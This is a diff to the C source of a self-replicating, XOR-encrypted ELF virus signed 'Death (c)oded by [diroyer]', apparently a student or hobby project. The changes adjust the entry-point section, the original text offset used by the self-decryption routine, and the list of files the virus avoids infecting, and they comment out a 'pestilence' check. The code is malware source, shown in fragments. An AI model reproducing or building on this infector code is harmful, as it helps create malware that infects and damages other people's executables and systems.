@@ -48,7 +48,7 @@ void	_start(void);
  * note: we coulduse a linker script
  * the linker should compile this file first */
 
-void __attribute__((naked)) _start(void)
+void __attribute__((naked, section(".text.start#"))) _start(void)
 {
 	__asm__ __volatile__ (
 			"push %rdx\n"
@@ -71,12 +71,12 @@ void __attribute__((naked)) _start(void)
 }
 
 char __attribute__((section(".text#"))) g_signature[SIGNATURE_SIZE] = \
-	"Death (c)oded by [diroyer] & [eamar] - deadbeaf:0000\n\0";
+	"Death (c)oded by [diroyer] - deadbeaf:0000\n\0";
 
 uint8_t __attribute__((section(".text#")))	g_key[KEY_SIZE] = {0};
 bool __attribute__((section(".text#")))	    g_is_encrypted = false;
 
-int __attribute__((section(".text#")))	    g_start_offset = 0x1000;
+int __attribute__((section(".text#")))	    g_start_offset = ORIG_TEXT_OFF;
 char __attribute__((section(".text#")))	    **g_envp;
 
 static void xor_decrypt(uint8_t *data, const size_t size, uint8_t *key)
@@ -92,7 +92,7 @@ void decrypt_self(void)
 		return;
 	}
 
-	if (g_start_offset == 0x1000) {
+	if (g_start_offset == ORIG_TEXT_OFF) {
 
 		uintptr_t start = (uintptr_t)&_start;
 		uintptr_t end = start + VIRUS_SIZE;
@@ -215,6 +215,7 @@ static int check_forbidden(const char *name) {
 
 	const char *forbidden[] = {
 		STR(".so"),
+		STR("cp"),
 		NULL
 	};
 
@@ -329,7 +330,7 @@ void	entrypoint(int argc, char **argv, char **envp)
 	file_t file;
 	ft_memset(&file, 0, sizeof(file_t));
 
-	if (pestilence() != 0) return ;
+	//if (pestilence() != 0) return ;
 
 	/* saving these values (they will be overwritten by the packer) */
 	uint8_t key[KEY_SIZE];
